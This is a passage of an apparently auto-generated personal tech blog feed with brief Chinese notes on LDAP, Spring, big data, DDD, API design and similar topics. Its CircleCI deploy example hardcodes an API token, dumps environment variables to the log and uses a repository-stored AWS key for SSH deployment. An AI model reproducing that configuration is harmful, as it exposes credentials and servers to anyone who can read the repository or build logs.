        <content type="html"><![CDATA[<p>Web客户端追踪，主要是指用户使用客户端（通常是指浏览器）访问Web网站时，Web服务器通过一系列手段对用户客户端进行标记和识别，进而关联和分析用户行为的技术。</p><p>解决类似禁用了 cookie 后如何识别用户身份和登录问题</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>panopticlick 浏览器指纹监测工具 <a href="https://panopticlick.eff.org/" target="_blank" rel="noopener">https://panopticlick.eff.org/</a> </li><li>fingerprintjs 浏览器指纹JS库 <a href="http://valve.github.io/fingerprintjs/" target="_blank" rel="noopener">http://valve.github.io/fingerprintjs/</a></li><li>各种存放cookie的技术 <a href="https://github.com/samyk/evercookie" target="_blank" rel="noopener">https://github.com/samyk/evercookie</a></li><li>Web客户端追踪（上）—Cookie追踪 <a href="https://paper.seebug.org/227/" target="_blank" rel="noopener">https://paper.seebug.org/227/</a></li><li>Web客户端追踪（下）—浏览器指纹追踪 <a href="https://paper.seebug.org/229/" target="_blank" rel="noopener">https://paper.seebug.org/229/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ldap</title>
      <link href="/security/security/ldap/"/>
      <url>/security/security/ldap/</url>
      
        <content type="html"><![CDATA[<p>LDAP是轻量目录访问协议，英文全称是Lightweight Directory Access Protocol，一般都简称为LDAP。它是基于X.500标准的，但是简单多了并且可以根据需要定制。与X.500不同，LDAP支持TCP/IP，这对访问Internet是必须的。LDAP的核心规范在RFC中都有定义，所有与LDAP相关的RFC都可以在LDAPman RFC网页中找到。</p><p>一般在大型企业IT架构中使用，用于维护一个中心化的用户账户和权限，例如JIRA、邮箱、WIKI等。另外一个实现是windows 的活动目录（AD）</p><p>OpenLDAP是LDAP协议的一个开源实现，具有组件：</p><ul><li>OpenLDAP OpenLDAP的服务器本身，目录服务器</li><li>phpLDAPadmin 管理图形界面</li><li>PWM 用户自主账号管理</li><li>客户端 （各个接入的应用自己实现，例如JIRA）</li></ul><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>OpenLDAP 安装<a href="https://wiki.archlinux.org/index.php/OpenLDAP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/OpenLDAP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>微格式 (Microformat）</title>
      <link href="/frontend/frontend/micro-format/"/>
      <url>/frontend/frontend/micro-format/</url>
      
        <content type="html"><![CDATA[<p>微格式（Microformat），是通过语意相关让内容人机可读。网页上的允许的微格式数据包括事件、人物、地点等，它可以被其他的软件检测到，并提取出相应的信息，以及对信息进行索引、搜索、跨平台的参考，把这些信息以其他形式重复使用或组合。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://schema.org" target="_blank" rel="noopener">https://schema.org</a></li><li><a href="http://microformats.org/" target="_blank" rel="noopener">http://microformats.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> frontend </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>web 视觉设计系统</title>
      <link href="/frontend/frontend/design-system/"/>
      <url>/frontend/frontend/design-system/</url>
      
        <content type="html"><![CDATA[<p>在做前端开发和设计时，遇到的一个问题是如何像让每个颜色、尺寸、组件全局统一，因此我们需要前端开发者和UX有一个统一的设计。</p><p>从而演化出自己的一套设计系统框架和项目模板，类似于 bootstrap和Foundation </p><h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h2><ul><li>css 设计系统汇总 <a href="https://github.com/topics/design-system?l=css" target="_blank" rel="noopener">https://github.com/topics/design-system?l=css</a></li><li>primer css <a href="https://github.com/primer/css" target="_blank" rel="noopener">https://github.com/primer/css</a></li><li>codyhouse framework <a href="https://github.com/CodyHouse/codyhouse-framework" target="_blank" rel="noopener">https://github.com/CodyHouse/codyhouse-framework</a></li></ul><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>Design Systems: Building for the Future <a href="https://css-tricks.com/design-systems-building-future/" target="_blank" rel="noopener">https://css-tricks.com/design-systems-building-future/</a></li><li>Salesforce 提供的一套轻量级设计系统方案 <a href="https://www.lightningdesignsystem.com/utilities/alignment/" target="_blank" rel="noopener">https://www.lightningdesignsystem.com/utilities/alignment/</a></li><li>视频课程 <a href="https://www.lynda.com/CSS-tutorials/CSS-Design-Systems-Architectures/688549-2.html" target="_blank" rel="noopener">https://www.lynda.com/CSS-tutorials/CSS-Design-Systems-Architectures/688549-2.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> frontend </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring cloud 生态概览</title>
      <link href="/springcloud/springcloud/overview-of-spring-cloud/"/>
      <url>/springcloud/springcloud/overview-of-spring-cloud/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB-present-层"><a href="#WEB-present-层" class="headerlink" title="WEB present 层"></a>WEB present 层</h2><ul><li>Spring HATEOAS</li><li>Spring Mobile</li><li>Spring Web Flow</li><li>Spring Session</li><li>Spring Web Services</li><li>Spring Social</li><li>Spring for Android</li><li>Spring Security</li></ul><h2 id="通用层"><a href="#通用层" class="headerlink" title="通用层"></a>通用层</h2><ul><li>Spring Web</li><li>Spring Test</li><li>Spring Data Access/Integration</li><li>Spring AOP and Instrumentation</li><li>Spring Messaging</li><li>Spring Core Container</li></ul><h2 id="数据访问层"><a href="#数据访问层" class="headerlink" title="数据访问层"></a>数据访问层</h2><ul><li>Spring AMQP</li><li>Spring LDAP</li><li>Spring Data</li><li>Spring Batch</li></ul><h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h2><p>TODO</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>spring-ecosystem/ <a href="http://springtutorials.com/spring-ecosystem/" target="_blank" rel="noopener">http://springtutorials.com/spring-ecosystem/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> springcloud </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>大数据概览</title>
      <link href="/bigdata/bigdata/overview-of-big-data/"/>
      <url>/bigdata/bigdata/overview-of-big-data/</url>
      
        <content type="html"><![CDATA[<p>大数据（big data），指无法在一定时间范围内用常规软件工具进行捕捉、管理和处理的数据集合，是需要新处理模式才能具有更强的决策力、洞察发现力和流程优化能力的海量、高增长率和多样化的信息资产。</p><p>5个维度描述大数据，Volume（大量）、Velocity（高速）、Variety（多样）、Value（低价值密度）、Veracity（真实性）</p><h2 id="程序员掌握的4个维度"><a href="#程序员掌握的4个维度" class="headerlink" title="程序员掌握的4个维度"></a>程序员掌握的4个维度</h2><ul><li>A AI</li><li>B Big data </li><li>C coding </li><li>D Devops</li></ul><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li>分布式存储 区别于传统的数据存储方式，由单机变成计算机集群来处理数据</li><li>大数据相关职位<ul><li>数据分析师</li><li>数据科学家</li><li>数据工程师</li></ul></li><li>数据工程的特征<ul><li>拓展性</li><li>容错性</li><li>弹性</li><li>可调式性</li><li>可维护性</li></ul></li><li>数据分区  将数据分散到多台机器上处理</li><li>数据映射 数据流和结构化数据之间的关系</li><li>排序</li><li>真实数据源</li><li>推与拉</li></ul><h2 id="相关技术"><a href="#相关技术" class="headerlink" title="相关技术"></a>相关技术</h2><ul><li>HDFS: Hadoop分布式文件系统(Distributed File System) － HDFS (Hadoop Distributed File System)</li><li>MapReduce：并行计算框架，0.20前使用 org.apache.hadoop.mapred 旧接口，0.20版本开始引入org.apache.hadoop.mapreduce的新API</li><li>HBase: 类似Google BigTable的分布式NoSQL列数据库。（HBase和Avro已经于2010年5月成为顶级 Apache 项目）</li><li>Hive：数据仓库工具，由Facebook贡献。</li><li>Zookeeper：分布式锁设施，提供类似Google Chubby的功能，由Facebook贡献。</li><li>Avro：新的数据序列化格式与传输工具，将逐步取代Hadoop原有的IPC机制。</li><li>Pig: 大数据分析平台，为用户提供多种接口。</li><li>Ambari：Hadoop管理工具，可以快捷的监控、部署、管理集群。</li><li>Sqoop：于在HADOOP与传统的数据库间进行数据的传递。</li><li>Spark: 用来做数据流处理</li><li>CDH： 企业级的部署工具 Cloud Distribution Hadoop</li></ul><h2 id="数据工程的4层架构"><a href="#数据工程的4层架构" class="headerlink" title="数据工程的4层架构"></a>数据工程的4层架构</h2><ul><li>Infrastracture<ul><li>AWS</li><li>GCP</li></ul></li><li>Data management and storage<ul><li>Hadoop DFS</li><li>Solr </li><li>Redis</li><li>AeroSpike</li><li>Asterix DB</li></ul></li><li>Data integration and process<ul><li>Kafka</li><li>Spark</li><li>Druid</li><li>beam</li><li>Flink</li><li>Storm</li><li>Google cloud DataFlow</li><li>Kinesis</li></ul></li><li>Coorination and Workflow management<ul><li>Airflow</li><li>Ozzie</li><li>Apache zookeeper</li><li>Apache Ambari</li><li>Talend</li></ul></li></ul><h2 id="最小工具集"><a href="#最小工具集" class="headerlink" title="最小工具集"></a>最小工具集</h2>]]></content>
      
      
      <categories>
          
          <category> bigdata </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>英文邮件写作</title>
      <link href="/communication/write%20better%20email/"/>
      <url>/communication/write%20better%20email/</url>
      
        <content type="html"><![CDATA[<h1 id="邮件标题"><a href="#邮件标题" class="headerlink" title="邮件标题"></a>邮件标题</h1><p>推荐使用动词、正面的词语</p><p>Not good:</p><blockquote><p>Could you review the pull request?</p></blockquote><p>Bat good:</p><blockquote><p>Approval for pull request</p></blockquote><h1 id="Greeting"><a href="#Greeting" class="headerlink" title="Greeting"></a>Greeting</h1><h2 id="称呼"><a href="#称呼" class="headerlink" title="称呼"></a>称呼</h2><p>称呼使用’Dear’ or ‘Hi’？Dear 比 Hi 正式</p><h2 id="称谓"><a href="#称谓" class="headerlink" title="称谓"></a>称谓</h2><p>姓、名不能混，如果不能分清楚称呼，使用 ‘please correct me if I was wrong’<br>如果对方有头衔，比如doctor，应该使用 doctor xxx</p><h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>TIPS</p><ol><li>开始直接表明来意， I am writing to xxx</li><li>意图明显，比如是为了report或者寻求帮助</li><li>结束方法：<ol><li>寻求更多communication</li><li>寻求Feedback</li><li>感谢</li><li>offer potential help</li></ol></li></ol><h1 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h1><p>1.使用Best regards<br>2.thanks</p><h1 id="summary-of-learn-points"><a href="#summary-of-learn-points" class="headerlink" title="summary of learn points"></a>summary of learn points</h1><p>the fundamentals of Email</p><ul><li>Subject - catching attention in a positive way</li><li>Greeting - appropriate</li><li>Purpose - state it at the beginning </li><li>Request - Be noticeable,clear and flexible</li><li>Ending - invite communication and off help </li><li>Sign-off - professional</li></ul><h1 id="something-is-suitable-via-email"><a href="#something-is-suitable-via-email" class="headerlink" title="something is suitable via email"></a>something is suitable via email</h1><ul><li>Need to record for future reference</li><li>Communication to multiple </li><li>The different time zone </li><li>Need someone take time to deal with</li><li>Report</li></ul><h1 id="something-is-not-suitable-via-email"><a href="#something-is-not-suitable-via-email" class="headerlink" title="something is not suitable via email"></a>something is not suitable via email</h1><ul><li>Urgent things </li><li>negative staff</li><li>complicated situation</li></ul><h1 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h1><ul><li>mark text as bold?</li><li>directly or indirectly</li><li>how to make a appropriate appreciation</li></ul>]]></content>
      
      
      <categories>
          
          <category> communication </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端项目安全扫描</title>
      <link href="/security/security/security-in-frontend/"/>
      <url>/security/security/security-in-frontend/</url>
      
        <content type="html"><![CDATA[<h2 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h2><ul><li>Sonarqube</li><li>Synk</li></ul><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><ul><li>Npm audit </li><li>Retire.js</li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>微软SDL( Security Development Lifecycle)流程</title>
      <link href="/security/security/Security-Development-Lifecycle/"/>
      <url>/security/security/Security-Development-Lifecycle/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>微软SDL( Security Development Lifecycle)流程，是一种专注于软件开发安全保障的流程，为了实现保证最终的用户安全，在软件开发各阶段中引入安全和隐私问题。</p><h2 id="项目中实践"><a href="#项目中实践" class="headerlink" title="项目中实践"></a>项目中实践</h2><p>在项目中使用微软提供的工具，绘制威胁建模图表，用于分析和分享安全建模</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>官网 <a href="http://www.microsoft.com/security/sdl/default.aspx" target="_blank" rel="noopener">http://www.microsoft.com/security/sdl/default.aspx</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>FastDFS 分布式文件系统方案</title>
      <link href="/architecture/architecture/fastDFS/"/>
      <url>/architecture/architecture/fastDFS/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>FastDFS是一个开源的轻量级分布式文件系统，它对文件进行管理，功能包括：文件存储、文件同步、文件访问（文件上传、文件下载）等，解决了大容量存储和负载均衡的问题。特别适合以文件为载体的在线服务，如相册网站、视频网站等等。</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>上传</p><ol><li>client询问tracker上传到的storage，不需要附加参数；</li><li>tracker返回一台可用的storage；</li><li>client直接和storage通讯完成文件上传。</li></ol><p>下载</p><ol><li>client询问tracker下载文件的storage，参数为文件标识（卷名和文件名）；</li><li>tracker返回一台可用的storage；</li><li>client直接和storage通讯完成文件下载。</li></ol>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>读书清单</title>
      <link href="/reading-writing/reading&amp;writing/reading%20list/"/>
      <url>/reading-writing/reading&amp;writing/reading%20list/</url>
      
        <content type="html"><![CDATA[<p>-《经济学思维》</p><ul><li>DDD  <a href="https://www.infoq.com/minibooks/domain-driven-design-quickly" target="_blank" rel="noopener">Domain Driven Design Quickly</a></li><li>《领域驱动设计》</li></ul>]]></content>
      
      
      <categories>
          
          <category> reading&amp;writing </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Circle CI 基本使用</title>
      <link href="/devops/devops/circleci%20basic/"/>
      <url>/devops/devops/circleci%20basic/</url>
      
        <content type="html"><![CDATA[<h2 id="CircleCI是什么"><a href="#CircleCI是什么" class="headerlink" title="CircleCI是什么"></a>CircleCI是什么</h2><p>CircleCI is a continuous integration engine offered as SaaS and on premise.</p><h2 id="CircleCI特点"><a href="#CircleCI特点" class="headerlink" title="CircleCI特点"></a>CircleCI特点</h2><ul><li>容易和Github集成</li><li>SasS平台，无需自己搭建环境</li></ul><h2 id="有用的资源"><a href="#有用的资源" class="headerlink" title="有用的资源"></a>有用的资源</h2><ul><li>官网：<a href="https://circleci.com/" target="_blank" rel="noopener">https://circleci.com/</a></li><li>文档：<a href="https://circleci.com/docs/" target="_blank" rel="noopener">https://circleci.com/docs/</a></li><li>技术雷达的演讲keynote：<a href="http://wiki.printf.cn/media/CIrcleCI%20on%20tech%20Radar.key">http://wiki.printf.cn/media/CIrcleCI%20on%20tech%20Radar.key</a></li></ul><h2 id="一个构建java并部署的例子"><a href="#一个构建java并部署的例子" class="headerlink" title="一个构建java并部署的例子"></a>一个构建java并部署的例子</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line"><span class="attr">  build:</span></span><br><span class="line"><span class="attr">    machine:</span></span><br><span class="line"><span class="attr">      java:</span></span><br><span class="line"><span class="attr">        version:</span> <span class="string">oraclejdk8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    working_directory:</span> <span class="string">~/whoisspy</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    steps:</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">      -</span> <span class="string">checkout</span></span><br><span class="line"></span><br><span class="line"><span class="attr">      - run:</span> <span class="string">./gradlew</span> <span class="string">clean</span> <span class="string">build</span></span><br><span class="line"></span><br><span class="line"><span class="attr">      - store_artifacts:</span></span><br><span class="line"><span class="attr">          path:</span> <span class="string">build/libs</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  deploy:</span></span><br><span class="line"><span class="attr">    machine:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    working_directory:</span> <span class="string">~/whoisspy</span></span><br><span class="line"><span class="attr">    steps:</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">      -</span> <span class="string">checkout</span></span><br><span class="line"></span><br><span class="line"><span class="attr">      - run:</span></span><br><span class="line"><span class="attr">          name:</span> <span class="string">Display</span> <span class="string">current</span> <span class="string">position</span></span><br><span class="line"><span class="attr">          command:</span> <span class="string">pwd</span></span><br><span class="line"></span><br><span class="line"><span class="attr">      - run:</span></span><br><span class="line"><span class="attr">          name:</span> <span class="string">Display</span> <span class="string">those</span> <span class="string">variables</span></span><br><span class="line"><span class="attr">          command:</span> <span class="string">env</span></span><br><span class="line"></span><br><span class="line"><span class="attr">      - run:</span></span><br><span class="line"><span class="attr">          name:</span> <span class="string">Download</span> <span class="string">jar</span> <span class="string">file</span></span><br><span class="line"><span class="attr">          command:</span> <span class="string">|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            export CIRCLE_TOKEN='?circle-token=93106a0b530273d9cb344ea608bc609490fdf202'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            curl https://circleci.com/api/v1.1/project/github/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME/$CIRCLE_PREVIOUS_BUILD_NUM/artifacts$CIRCLE_TOKEN | grep -o 'https://[^"]*' &gt; artifacts.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;artifacts.txt xargs -P4 -I % wget %</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span><span class="attr">      - run:</span></span><br><span class="line"><span class="attr">          name:</span> <span class="string">Display</span> <span class="string">whole</span> <span class="string">list</span></span><br><span class="line"><span class="attr">          command:</span> <span class="string">ls</span> <span class="bullet">-al</span> <span class="string">&amp;</span> <span class="string">aws</span> <span class="bullet">--version</span></span><br><span class="line"></span><br><span class="line"><span class="attr">      - run:</span></span><br><span class="line"><span class="attr">          name:</span> <span class="string">Change</span> <span class="string">permission</span> <span class="string">for</span> <span class="string">aws.pem</span></span><br><span class="line"><span class="attr">          command:</span> <span class="string">chmod</span> <span class="number">0600</span> <span class="string">.circleci/aws.pem</span></span><br><span class="line"></span><br><span class="line"><span class="attr">      - run:</span></span><br><span class="line"><span class="attr">          name:</span> <span class="string">SCP</span> <span class="string">file</span> <span class="string">to</span> <span class="string">instance</span></span><br><span class="line"><span class="attr">          command:</span> <span class="string">scp</span> <span class="bullet">-i</span> <span class="string">"./.circleci/aws.pem"</span> <span class="string">whoisspy-0.0.1-SNAPSHOT.jar</span> <span class="string">ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com:/home/ubuntu/workspace/whoisspy-0.0.1-SNAPSHOT.jar</span></span><br><span class="line"></span><br><span class="line"><span class="attr">      - run:</span></span><br><span class="line"><span class="attr">          name:</span> <span class="string">login</span> <span class="string">to</span> <span class="string">target</span> <span class="string">instance</span></span><br><span class="line"><span class="attr">          command:</span> <span class="string">|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            ssh -i "./.circleci/aws.pem" ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com 'ls</span></span><br><span class="line"><span class="string">            cd workspace</span></span><br><span class="line"><span class="string">            #kill old instance</span></span><br><span class="line"><span class="string">            output=$( netstat -apn | grep 8086 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;$&#123;output//[^0-9]/ &#125; &amp;&amp; kill -9 $num5 || pwd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            # todo start new instance</span></span><br><span class="line"><span class="string">            java -jar whoisspy-0.0.1-SNAPSHOT.jar &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            # test if it has been started</span></span><br><span class="line"><span class="string">            netstat -apn | grep 8086'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span><span class="attr">      - run:</span></span><br><span class="line"><span class="attr">          name:</span> <span class="string">last</span> <span class="string">step</span></span><br><span class="line"><span class="attr">          command:</span> <span class="string">pwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#      - run:</span></span><br><span class="line"><span class="comment">#          name: kill ssh process</span></span><br><span class="line"><span class="comment">#          command: |</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#            pid=$( ps aux | grep amazonaws | awk '&#123;print $2&#125;' | sort -n | head -n 1 )</span></span><br><span class="line"><span class="comment">#            sleep 5 &amp;&amp; kill $&#123;pid&#125; &amp;&amp; echo "ssh command is complete"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">workflows:</span></span><br><span class="line"><span class="attr">  version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">  build-deploy:</span></span><br><span class="line"><span class="attr">    jobs:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">build</span></span><br><span class="line"><span class="attr">      - deploy:</span></span><br><span class="line"><span class="attr">          requires:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">build</span></span><br><span class="line"><span class="attr">          filters:</span></span><br><span class="line"><span class="attr">            branches:</span></span><br><span class="line"><span class="attr">              only:</span> <span class="string">set-ci</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DDD (Domain-Driven Design) 领域驱动设计</title>
      <link href="/architecture/architecture/Domain%20Driven%20Design/"/>
      <url>/architecture/architecture/Domain%20Driven%20Design/</url>
      
        <content type="html"><![CDATA[<h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><ul><li><p>DDD是一套综合软件系统分析和设计的面向对象建模方法，与此相似的工程方法还有RUP（统一建模语言）。DDD解决的问题是应用复杂问题下的建模问题。</p></li><li></li></ul><h1 id="DDD的实践"><a href="#DDD的实践" class="headerlink" title="DDD的实践"></a>DDD的实践</h1><ul><li>边界上下文</li><li>Event storming</li></ul><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ul><li>DDD 有什么标准和产出</li><li>Domain模型发生变化如何处理？</li><li>服务之间的事务如何处理？</li><li>服务之间通信认证方式</li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Single sign-on (SSO) 单点登录技术方案</title>
      <link href="/architecture/architecture/SSO/"/>
      <url>/architecture/architecture/SSO/</url>
      
        <content type="html"><![CDATA[<ul><li>OpenID 方案</li><li>CAS 方案</li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API RESTful 风格</title>
      <link href="/API-service/api/api-restful/"/>
      <url>/API-service/api/api-restful/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>REST（英文：Representational State Transfer，简称REST），RESTful是一种对基于HTTP的应用设计风格，只是提供了一组设计原则和约束条件，而不是一种标准。网络上有大量对RESTful风格的解读，简单来说Restful定义URI和HTTP状态码，让你的API设计变得更简洁、清晰和富有层次，对缓存等实现更有帮助。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>个人博客 <a href="http://www.printf.cn/index.php/archives/api-design-restful.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/archives/api-design-restful.html</a></li><li>JSON API 参考规范 <a href="http://jsonapi.org/format/" target="_blank" rel="noopener">http://jsonapi.org/format/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> API&amp;service </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API 文档和契约</title>
      <link href="/API-service/api/api-document-and-contract/"/>
      <url>/API-service/api/api-document-and-contract/</url>
      
        <content type="html"><![CDATA[<p>实现API文档生成和前后端合作的几种方案。</p><ul><li><p>基于注释的 API 文档：这是一种通过代码中注释生成 API 文档的轻量级方案，它的好处是简单易用，基本与编程语言无关。因为基于注释，非常适合动态语言的文档输出，例如 Nodejs、PHP、Python。由于NPM包容易安装和使用，这里推荐 nodejs 平台下的 apidocjs。</p></li><li><p>基于反射的 API 文档：使用 swagger 这类通过反射来解析代码，只需要定义好 Model，可以实现自动输出 API 文档。这种方案适合强类型语言例如 Java、.Net，尤其是生成一份稳定、能在团队外使用的 API 文档。</p></li><li><p>使用契约进行前后端协作：在团队内部，前后端协作本质上需要的不是一份 API 文档，而是一个可以供前后端共同遵守的契约。前后端可以一起制定一份契约，使用这份契约共同开发，前端使用这份契约 mock API，后端则可以通过它简单的验证API是否正确输出。</p></li></ul><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>博客 <a href="http://www.printf.cn/index.php/archives/api-design-document-and-contract.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/archives/api-design-document-and-contract.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> API&amp;service </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用正则表达式</title>
      <link href="/other/others/regex-expressions/"/>
      <url>/other/others/regex-expressions/</url>
      
        <content type="html"><![CDATA[<p>/^[0-9]+(.)?([0-9]{1,2})?$/</p>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>清理对象中的空值</title>
      <link href="/frontend/frontend/clean-empty-attribute-in-object/"/>
      <url>/frontend/frontend/clean-empty-attribute-in-object/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">export function cleanNull(object)&#123;</span><br><span class="line">  const returnValue = &#123;&#125;</span><br><span class="line">  Object.keys(object).map((key)=&gt;&#123;</span><br><span class="line">    const value = object[key]</span><br><span class="line">    if (value === undefined || value === null || value === &apos;&apos;) &#123;</span><br><span class="line">      return</span><br><span class="line">    &#125;</span><br><span class="line">    returnValue[key] = value</span><br><span class="line">    return key</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  return returnValue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> frontend </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端代码的一些反模式</title>
      <link href="/frontend/frontend/bad-example-in-codereview/"/>
      <url>/frontend/frontend/bad-example-in-codereview/</url>
      
